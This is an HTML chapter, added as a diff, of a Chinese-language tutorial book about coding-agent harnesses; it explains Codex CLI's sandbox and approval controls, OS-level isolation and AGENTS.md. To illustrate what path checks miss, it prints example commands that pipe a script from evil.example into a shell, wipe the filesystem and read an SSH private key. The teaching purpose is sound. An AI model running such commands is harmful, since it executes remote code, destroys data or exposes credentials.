@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>第 12 章 · codex — 写自己的 Harness</title>
+<link rel="stylesheet" href="assets/book.css">
+</head>
+<body>
+<button class="menu-btn" type="button">目录</button>
+<div class="shell">
+  <aside class="rail" data-toc></aside>
+  <main class="paper">
+    <header class="chap-head">
+      <p class="kicker">第四部 · 取舍</p>
+      <h1>第 12 章 · codex：工业级约束</h1>
+      <p class="lead">OpenAI 官方 CLI 的主体在 Rust。工业级不是更长的系统提示，是：模型进程和被它喊起来的命令不在同一个权限域里。</p>
+    </header>
+    <article class="prose">
+      <div class="plain-box">
+        <p class="label">这一章只要记住</p>
+        <p>仓库 <a href="https://github.com/openai/codex">openai/codex</a>（快照 rust-v0.155.0-alpha.6，2026-09-15）。看两个旋钮：沙箱（命令能做什么）和审批（什么时候必须问人）。miniharness 的路径检查相对这个，只是礼貌。</p>
+      </div>
+
+      <h2>先把第 6 章的缺口说清楚</h2>
+      <p>我们的 <code>Workspace</code> 能挡住 <code>read("../secrets.env")</code>。挡不住：</p>
+      <figure class="code">
+        <figcaption>路径笼子管不到的事</figcaption>
+        <pre><code>bash("curl http://evil.example | sh")
+bash("rm -rf /")
+bash("cat ~/.ssh/id_rsa")
+</code></pre>
+      </figure>
+      <p>因为 bash 是「在工作区里启动一个真正的壳」，壳一旦起来，权限就是你这个用户的权限。教学包必须承认这件事，不能靠提示词里写「请不要乱来」。</p>
+      <div class="callout analogy">
+        <p class="label">生活比喻</p>
+        <p>第 6 章是在厨房门口贴告示：「不要进冷藏库」。Codex 是把冷藏库的门锁上，钥匙分两把：一把决定锁有多紧（沙箱），一把决定谁有权开锁（审批）。告示挡君子，锁挡真把刀拿出来的人。</p>
+      </div>
+
+      <h2>拆箱方式本身就是架构</h2>
+      <table class="plain">
+        <thead><tr><th>板块</th><th>职责</th></tr></thead>
+        <tbody>
+          <tr><td>core</td><td>业务逻辑，希望变成别人也能链的库。</td></tr>
+          <tr><td>exec</td><td>无头模式，给自动化 / CI，没有全屏界面。</td></tr>
+          <tr><td>tui</td><td>全屏终端界面。</td></tr>
+          <tr><td>cli</td><td>把上面焊成一个二进制。</td></tr>
+        </tbody>
+      </table>
+      <p>和 pi 一样：循环不跟某一张脸绑死。不同的是语言选择——Rust 换来单文件分发、和操作系统沙箱接口的近距离接触、以及更少的运行时惊喜。代价是扩展的门槛更高。</p>
+
+      <h2>两个旋钮，不要拧成一个</h2>
+      <p><strong>沙箱模式</strong>回答：不经人允许，命令能做什么？常见档位包括只读、工作区可写、完全放开。</p>
+      <p><strong>审批策略</strong>回答：什么时候必须问人？即使沙箱已经很紧，出界仍可「请求升级」。</p>
+      <table class="plain">
+        <thead><tr><th>组合（示意）</th><th>人话</th></tr></thead>
+        <tbody>
+          <tr><td>工作区可写 + 出界再问</td><td>日常写代码。出了仓库要你点头</td></tr>
+          <tr><td>只读 + 几乎全问</td><td>先看、先计划，动手前确认</td></tr>
+          <tr><td>全放开 + 永远不问</td><td>真正的 YOLO。Codex 把这个名字弄得很吓人，是产品诚实</td></tr>
+        </tbody>
+      </table>
+      <p>nanocode 只有 YOLO。把危险默认成唯一选项，和把危险做成显式、吓人的名字，是两种产品道德。</p>
+
+      <h2>约束下沉到操作系统</h2>
+      <ul>
+        <li>macOS：Seatbelt（<code>sandbox-exec</code> 一套默认拒绝的配置）。</li>
+        <li>Linux：bubblewrap + Landlock + seccomp 的组合，随内核能力降级。</li>
+        <li>被关进沙箱的是<strong>子命令</strong>，不是整个 CLI 进程。CLI 还要画画、读配置、找密钥。</li>
+      </ul>
+      <p>容器里这些机制可能不可用，文档会叫你在外层容器隔离，然后内层放开。工业级文档的标志是：把「什么时候失效」写清楚。</p>
+      <div class="callout">
+        <p class="label">先别管</p>
+        <p>具体系统调用表、Seatbelt 配置文件字段。那些会随内核和发版改。你要带走的是分层：Python 礼貌围栏 → 人点头 → OS 强制。以及：拒绝必须能和「命令自己失败」区分开，否则模型会在不该重试的时候重试。</p>
+      </div>
+
+      <h2>AGENTS.md：把规矩写进仓库</h2>
+      <p>项目级说明书，启动时读入上下文。这是「穿越模型迭代」的少数手段之一：把「测试怎么跑、哪些目录别动」写在仓库里，而不是写在某年某月的电子书。</p>
+      <p>你的 miniharness 还没读它。加一段「若工作区有 AGENTS.md，把它放进 system 提示」，是最小的生产化步骤，也不依赖任何框架。</p>
+
+      <h2>读这个仓库时问什么</h2>
+      <ul>
+        <li>一次被沙箱拒绝的 bash，如何区分「命令真失败」和「策略拒绝」？</li>
+        <li>审批界面在全屏 TUI 和无头 CI 下分别是什么行为？CI 里谁来点同意？</li>
+        <li>核心库和界面之间的接口稳不稳——这决定你能不能拿 core 做自己的皮肤。</li>
+      </ul>
+      <p>发版极快（一年里可以有数百个 tag）。不要背某一个 alpha 版本的特性列表。拉 releases，专门搜 <code>sandbox</code>、<code>approval</code>、<code>agents</code>。</p>
+
+      <h2>自测</h2>
+      <ul>
+        <li>为什么沙箱和审批必须是两个旋钮？</li>
+        <li>miniharness 把 bash 超时杀掉，算不算沙箱？</li>
+        <li>模型读到「操作被拒绝」和「文件不存在」，下一步分别可能怎样？</li>
+      </ul>
+      <details class="answer">
+        <summary>自测答案</summary>
+        <ol>
+          <li>一个限制能力（它做不到），一个限制自主（它做得到但要先问）。合成一个开关，你就没法表达「能力很小但完全自动」或「能力很大但每步问人」。</li>
+          <li>不算。超时是预算，不是权限隔离。超时后的进程如果没被真正隔离，仍可能已经发出了网络请求。</li>
+          <li>拒绝：应该换策略或问人，不该换一种写法硬闯（那是在越狱）。文件不存在：可以改路径再试。所以拒绝码要单独标明。</li>
+        </ol>
+      </details>
+    </article>
+    <nav class="pager" data-pager></nav>
+  </main>
+</div>
+<script src="assets/book.js"></script>
+</body>
+</html>
